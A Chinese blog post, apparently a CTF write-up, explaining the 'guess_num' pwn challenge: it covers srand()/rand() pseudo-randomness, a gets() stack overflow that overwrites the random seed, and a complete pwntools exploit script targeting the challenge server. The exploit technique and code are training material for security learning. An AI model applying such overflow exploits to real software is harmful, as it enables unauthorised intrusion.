@@ -1,0 +1,290 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>小张的博客</title>
+<meta name="description" content="我是小张，一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。" />
+<link rel="shortcut icon" href="https://zhangzy999.github.io//favicon.ico?v=1590980949805">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://zhangzy999.github.io//styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://zhangzy999.github.io/">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://zhangzy999.github.io//images/avatar.png?v=1590980949805" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">小张的博客</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#srand%E5%87%BD%E6%95%B0%E5%92%8Crand%E5%87%BD%E6%95%B0">srand()函数和rand()函数</a>
+<ul>
+<li><a href="#%E5%BC%95%E7%94%A8">引用</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+<li><a href="#%E8%A7%A3%E9%A2%98">解题</a>
+<ul>
+<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">题目分析</a></li>
+<li><a href="#%E7%BC%96%E5%86%99exp">编写exp</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="https://zhangzy999.github.io/" class="menu" style="animation-delay: 0s">
+          主页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          所有文章
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">HELLO WORLD.</div>
+    <a class="rss" href="https://zhangzy999.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">攻防世界pwn新手区—guess_num</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-06-01 / 6 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://zhangzy999.github.io//post-images/ad5_guess_num.jpg" alt="">
+        
+        <div class="post-content yue">
+          <h1 id="srand函数和rand函数">srand()函数和rand()函数</h1>
+<h2 id="引用">引用</h2>
+<p>解这个题首先我们要了解下srand()和rand()</p>
+<blockquote>
+<p>要计算机产生一个随机数不像扔色子一样，计算机的每一步操作，就是执行一堆代码，这些代码是事先安排好的，所以计算机的产生行为是不具有随机性和预测性的（当然这里说的是现阶段的计算机体系，到未来的计算机的体系，未知），所以计算机产生的随机数都不是真正意义上的随机数，只是伪随机数，他以一个真值（也称为种子）作为初始条件，然后用一定的算法不停迭代产生随机数。库函数中系统提供了两个函数用于产生随机数：srand()和rand()<br>
+rand函数：rand的内部是用线性同余法做的，不是真的随机数，只不过因为其周期特别长，所以在一定范围内可以看成是随机的，rand()会返回一随机值，范围在0到RAND_MAX间，在调用此函数产生随机数前，必须利用srand()设好随机数种子，若没有设随机数种子，rand()在调用时会自动设随机数种子为1。<br>
+返回值：返回0到RAND_MAX之间的整数值，RAND_MAX的范围最少在32767之间（int），即双字节（16位）。若unsigned int双字节是65535，且0-RAND_MAX每个数字被选中的随机率是相同的。  rand()产生的是假随机数，每次执行时是相同的，若要不同以不同的值来初始化，初始化的函数就是srand()<br>
+srand函数：and()用来设置rand()产生随机数时的随机数种子，参数seed必须是整数，通常可以用time(0)的返回值作为seed.如果每次seed都设置相同的值，rand()产生的随机数值每次都一样。<br>
+srand(unsigned)time(NULL))使用系统定时/计数器的值作为随机种子每个种子对应一组根据算法预先生成的随机数，所以在相同平台的环境下，不同时间产生的随机数是不同的，相应的若将srand(unsigned)tima(NULL)改为任一常量，则无论何时运行，运行多少次得到的随机数都是一组特定的序列，所以srand生成的随机数是伪随机数。但是，所谓的“伪随机数”指的并不是假的随机数，其实绝对的对技术只是一种假想状态的随机数，计算机只能生成相对的随机数，而这些随机数既是随机的又是有规律的，一部分遵守一定规律，一部分则不遵守任何规律，总结来说就是：计算机产生伪随机数而不是绝对的随机数<br>
+在每次产生随机序列前，先指定不同的种子，这样计算出来的随机序列就不完全相同了，而使用同种子相同的数调用rand()会导致相同的随机数序列被生成</p>
+</blockquote>
+<h2 id="总结">总结</h2>
+<p>总结一下上面的文本：srand()函数为rand()函数指定随机数种子，如果没有srand()函数，那么rand()函数的默认随机数种子就是1，那么为什么称rand()生成的数是伪随机数呢？这是因为，如果每次随机数种子一样，那么每次生成的随机数都是一样的，比如srand(1) ，那么每次的rand()出来的数字都是一样的，所以为了随机性得到提高，我们一般是用时间函数来作为随机数种子，因为时间时刻在变化，所以种子也在变化，那么随机性就会大大提高。</p>
+<h1 id="解题">解题</h1>
+<h2 id="题目分析">题目分析</h2>
+<p>我们拿到附件后，先运行一下看看程序是什么功能<br>
+<img src="https://zhangzy999.github.io//post-images/1590979884236.png" alt="" loading="lazy"><br>
+大致就是让我们输入名字，然后让我们猜随机数<br>
+我们看看程序开启了哪些保护<br>
+<img src="https://zhangzy999.github.io//post-images/1590979923609.png" alt="" loading="lazy"><br>
+看到保护之后瞬间不想做了:-(    金丝雀 nx 地址随机化 神马的都开了 （话说我好像在新手区）<br>
+不管了，IDA分析一下  先看main函数的代码  发现了几个有意思的点<br>
+<img src="https://zhangzy999.github.io//post-images/1590980021878.png" alt="" loading="lazy"><br>
+首先是gets输入名字  输入的字符串存到v9变量里面  那么漏洞应该就在这里没错了<br>
+接下来设置了一个随机数种子，当然，这个随机数种子的随机性肯定是没问题的<br>
+接下来是个for循环，让我们猜10个随机数，如果失败就退出程序，如果成功就运行for循环外面的那个函数<br>
+我们跟进去那个函数看看<br>
+<img src="https://zhangzy999.github.io//post-images/1590980242481.png" alt="" loading="lazy"><br>
+奈斯，直接cat flag，所以我们的任务就是来猜数字，不过是随机数，我们肯定即使是欧皇附体也是猜不到的，所以考虑gets那里溢出来覆盖随机数种子seed[0]，让种子变成一个常数，那么每次的随机数都一样，自然也就可预测了，我们查看一下偏移量<br>
+<img src="https://zhangzy999.github.io//post-images/1590980418344.png" alt="" loading="lazy"><br>
+然后就直接写exp</p>
+<h2 id="编写exp">编写exp</h2>
+<p>这个exp比之前的要略微复杂一些，经过查资料发现ctypes这个包很奈斯，里面的cdll.LoadLibrary()函数可以在在脚本中加载动态库，同时又能调用库中的函数，那么我们直接可以通过调用对象的srand()方法来确定种子，那我们就不用再编写c语言程序来确定随机数了，比较方便哈<br>
+通过命令ldd来确定库的路径</p>
+<pre><code>ldd filename
+</code></pre>
+<p>这样就得到了库位置（忘记截图了，懒的再回虚拟机截了）<br>
+然后直接写exp</p>
+<pre><code class="language-python">from pwn import *
+import ctypes
+
+ip = '124.126.19.106'
+port = '49021'
+r = remote(ip,port)
+
+elf = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
+elf.srand(1)
+offset = 0x20
+
+payload = 'A' * offset + p64(1)
+r.recvuntil('Your name:')
+r.sendline(payload)
+for i in range(0,10):
+        number = str(elf.rand()%6 + 1)
+        r.recvuntil('Please input your guess number:')
+        r.sendline(number)
+r.interactive()
+</code></pre>
+<p>然后就是flag辣<br>
+<img src="https://zhangzy999.github.io//post-images/1590980821050.png" alt="" loading="lazy"></p>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/Ifa1zGdzf/">
+            <span class="flex-auto">随机数种子</span>
+          </a>
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/wxEMEW0CR/">
+            <span class="flex-auto">栈溢出</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/ad_world_level2/">
+                <h3 class="post-title">
+                  攻防世界pwn新手区—level2
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://zhangzy999.github.io//media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
